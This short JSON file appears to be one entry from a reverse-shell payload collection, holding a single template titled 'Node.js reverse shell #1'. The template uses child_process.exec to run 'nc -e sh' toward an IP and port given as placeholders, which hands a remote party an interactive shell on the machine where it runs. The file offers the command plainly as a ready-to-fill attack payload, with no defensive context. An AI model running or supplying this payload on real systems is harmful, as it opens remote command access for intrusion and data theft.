{
  "commands": [
    {
      "title": "Node.js reverse shell #1",
      "template": "require('child_process').exec('nc -e sh {ip} {port}')",
      "description": "Simple Node.js reverse shell using netcat execution."
    }
  ]
}
